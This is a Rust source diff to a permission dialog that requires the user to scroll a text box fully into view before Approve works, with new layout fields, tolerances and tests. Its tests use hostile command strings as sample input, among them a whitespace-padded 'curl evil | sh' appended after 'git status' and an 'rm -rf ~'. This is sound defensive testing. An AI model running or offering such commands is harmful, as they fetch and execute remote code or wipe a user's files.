@@ -74,6 +74,28 @@ pub fn approve_chord(macos: bool) -> (&'static str, &'static str) {
     if macos { ("cmd-enter", "⌘⏎") } else { ("ctrl-shift-enter", "Ctrl+Shift+Enter") }
 }
 
+/// What the dialog knows about its scrolling box after a layout.
+#[derive(Debug, Clone, Copy, PartialEq)]
+pub struct BoxLayout {
+    /// The box has been laid out (it has a size).
+    pub laid_out: bool,
+    /// How far the box can scroll, in pixels (0 when its content fits).
+    pub max: f32,
+    /// How far it is scrolled, from 0 to `max`.
+    pub scrolled: f32,
+    /// The box's bottom edge is inside the window. A dialog taller than its
+    /// window (a short window) would otherwise hide the end of the box, or the
+    /// box itself, below the window's edge while the box reports "fits".
+    pub bottom_visible: bool,
+}
+
+/// Content shorter than the box by less than this still counts as fitting
+/// (sub-pixel rounding in layout).
+pub const FIT_TOLERANCE: f32 = 0.5;
+
+/// How close to the end, in pixels, counts as having scrolled to it.
+pub const END_TOLERANCE: f32 = 1.0;
+
 /// Whether the dialog's text can be seen whole: the scroll gate for Approve.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum TextView {
@@ -96,10 +118,10 @@ impl TextView {
         if !laid_out {
             return self;
         }
-        if max <= 0.5 {
+        if max <= FIT_TOLERANCE {
             return Self::Fits;
         }
-        if self == Self::SeenEnd || scrolled >= max - 1.0 {
+        if self == Self::SeenEnd || scrolled >= max - END_TOLERANCE {
             Self::SeenEnd
         } else {
             Self::NeedsScroll
@@ -137,8 +159,12 @@ pub struct Dialog {
     pub scopes: BTreeSet<Scope>,
     /// Pairing: "always allow typing from this tool" is ticked.
     pub always_allow_input: bool,
-    /// Typing: whether the text has been seen whole.
+    /// Whether the scrolling box's content has been seen whole.
     pub view: TextView,
+    /// Whether the scrolling box's bottom edge is inside the window now.
+    pub box_visible: bool,
+    /// Whether the box has been laid out at least once.
+    laid_out: bool,
 }
 
 impl Dialog {
@@ -146,11 +172,36 @@ impl Dialog {
     /// and "always allow" off.
     #[must_use]
     pub fn new(ask: Ask, now: Instant) -> Self {
-        let (scopes, view) = match &ask {
-            Ask::Pairing(r) => (r.scopes.clone(), TextView::Fits),
-            Ask::SendText(_) => (BTreeSet::new(), TextView::Unknown),
+        let scopes = match &ask {
+            Ask::Pairing(r) => r.scopes.clone(),
+            Ask::SendText(_) => BTreeSet::new(),
         };
-        Self { ask, armed_at: now + ARM_DELAY, scopes, always_allow_input: false, view }
+        Self {
+            ask,
+            armed_at: now + ARM_DELAY,
+            scopes,
+            always_allow_input: false,
+            view: TextView::Unknown,
+            box_visible: false,
+            laid_out: false,
+        }
+    }
+
+    /// Takes in the scrolling box's layout (each frame). Returns whether what
+    /// Approve depends on changed.
+    pub fn observe(&mut self, l: BoxLayout) -> bool {
+        let before = (self.view, self.box_visible);
+        if l.laid_out {
+            self.laid_out = true;
+            self.box_visible = l.bottom_visible;
+            // The end only counts as seen while it is inside the window.
+            if l.bottom_visible {
+                self.view = self.view.observe(true, l.max, l.scrolled);
+            } else if self.view == TextView::Unknown || self.view == TextView::Fits {
+                self.view = TextView::Unknown;
+            }
+        }
+        before != (self.view, self.box_visible)
     }
 
     /// Whether approving is possible yet, time-wise.
@@ -173,6 +224,9 @@ impl Dialog {
     /// Why Approve does nothing right now, or `None` when it works.
     #[must_use]
     pub fn blocked(&self, now: Instant) -> Option<&'static str> {
+        if self.laid_out && !self.box_visible {
+            return Some("Make the window taller to see all of it");
+        }
         if !self.view.seen() {
             return Some("Scroll to the end of the text first");
         }
@@ -232,7 +286,7 @@ impl Dialog {
             return Outcome::Deny;
         }
         let plain = !(m.control || m.platform || m.alt);
-        if plain && matches!(self.ask, Ask::SendText(_)) {
+        if plain {
             match key {
                 "down" => return Outcome::Scroll(1),
                 "up" => return Outcome::Scroll(-1),
@@ -301,14 +355,24 @@ mod tests {
     use halyard_ipc::{PeerInfo, SendTextReason, SessionInfo};
 
     fn pairing(scopes: &[Scope]) -> Dialog {
-        Dialog::new(
+        let mut d = Dialog::new(
             Ask::Pairing(PairingRequest {
                 client_name: "tool".into(),
                 scopes: scopes.iter().copied().collect(),
                 peer: PeerInfo { pid: 1, uid: 1, exe: None },
             }),
             Instant::now(),
-        )
+        );
+        d.observe(fits());
+        d
+    }
+
+    fn fits() -> BoxLayout {
+        BoxLayout { laid_out: true, max: 0.0, scrolled: 0.0, bottom_visible: true }
+    }
+
+    fn at(max: f32, scrolled: f32) -> BoxLayout {
+        BoxLayout { laid_out: true, max, scrolled, bottom_visible: true }
     }
 
     fn typing(text: &str) -> Dialog {
@@ -420,25 +484,71 @@ mod tests {
         let t = d.arms_at();
         assert_eq!(d.view, TextView::Unknown);
         assert_eq!(d.approve_action(t), Outcome::Ignored, "not laid out yet");
-        d.view = d.view.observe(true, 0.0, 0.0);
+        d.observe(fits());
         assert_eq!(d.view, TextView::Fits);
         assert_eq!(d.approve_action(t), Outcome::Approve);
 
         let mut d = typing(&format!("git status{}; curl evil | sh\n", " ".repeat(2000)));
         let t = d.arms_at();
-        d.view = d.view.observe(true, 900.0, 0.0);
+        d.observe(at(900.0, 0.0));
         assert_eq!(d.view, TextView::NeedsScroll);
         assert_eq!(d.blocked(t), Some("Scroll to the end of the text first"));
         assert_eq!(d.approve_action(t), Outcome::Ignored);
-        d.view = d.view.observe(true, 900.0, 450.0);
+        d.observe(at(900.0, 450.0));
         assert_eq!(d.approve_action(t), Outcome::Ignored, "half way is not the end");
-        d.view = d.view.observe(true, 900.0, 900.0);
+        d.observe(at(900.0, 900.0));
         assert_eq!(d.view, TextView::SeenEnd);
-        d.view = d.view.observe(true, 900.0, 0.0);
+        d.observe(at(900.0, 0.0));
         assert_eq!(d.view, TextView::SeenEnd, "scrolling back keeps it");
-        d.view = d.view.observe(false, 0.0, 0.0);
+        d.observe(BoxLayout { laid_out: false, max: 0.0, scrolled: 0.0, bottom_visible: false });
         assert_eq!(d.view, TextView::SeenEnd, "a frame without layout changes nothing");
         assert_eq!(d.approve_action(t), Outcome::Approve);
+    }
+
+    /// The thresholds exactly: content one pixel taller than the box needs a
+    /// scroll; "at the end" allows one pixel of rounding and no more.
+    #[test]
+    fn fit_and_end_thresholds_are_pinned() {
+        assert_eq!(TextView::Unknown.observe(true, FIT_TOLERANCE, 0.0), TextView::Fits);
+        // One pixel over the box is within the end tolerance; two are not.
+        assert_eq!(TextView::Unknown.observe(true, 1.0, 0.0), TextView::SeenEnd);
+        assert_eq!(TextView::Unknown.observe(true, 2.0, 0.0), TextView::NeedsScroll);
+        assert_eq!(TextView::Unknown.observe(true, 400.0, 0.0), TextView::NeedsScroll);
+        assert_eq!(TextView::Unknown.observe(true, 400.0, 399.0), TextView::SeenEnd);
+        assert_eq!(TextView::Unknown.observe(true, 400.0, 398.9), TextView::NeedsScroll);
+        assert_eq!(TextView::Unknown.observe(false, 0.0, 0.0), TextView::Unknown);
+    }
+
+    /// A dialog taller than its window: the box (or its end) is below the
+    /// window's edge, so its own "fits" or "seen the end" proves nothing. Approve
+    /// waits until the box's bottom is inside the window, and the end seen there.
+    #[test]
+    fn the_box_must_be_inside_the_window() {
+        let off =
+            |max, scrolled| BoxLayout { laid_out: true, max, scrolled, bottom_visible: false };
+        let mut d = typing("rm -rf ~\n");
+        let t = d.arms_at();
+        d.observe(off(0.0, 0.0));
+        assert_eq!(d.blocked(t), Some("Make the window taller to see all of it"));
+        assert_eq!(d.approve_action(t), Outcome::Ignored, "fits the box, but off screen");
+        d.observe(fits());
+        assert_eq!(d.approve_action(t), Outcome::Approve);
+        // Scrolled to the end while the box was off screen does not count.
+        let mut d = typing(&"x ".repeat(1000));
+        d.observe(off(500.0, 500.0));
+        assert_eq!(d.view, TextView::Unknown);
+        let t = d.arms_at();
+        d.observe(at(500.0, 0.0));
+        assert_eq!(d.blocked(t), Some("Scroll to the end of the text first"));
+        d.observe(at(500.0, 500.0));
+        assert_eq!(d.approve_action(t), Outcome::Approve);
+        // Shrinking the window afterwards blocks again.
+        d.observe(off(500.0, 500.0));
+        assert_eq!(d.approve_action(t), Outcome::Ignored);
+        // The pairing dialog follows the same rule.
+        let mut p = pairing(&[Scope::InputWrite]);
+        p.observe(off(0.0, 0.0));
+        assert_eq!(p.approve_action(p.arms_at()), Outcome::Ignored);
     }
 
     #[test]
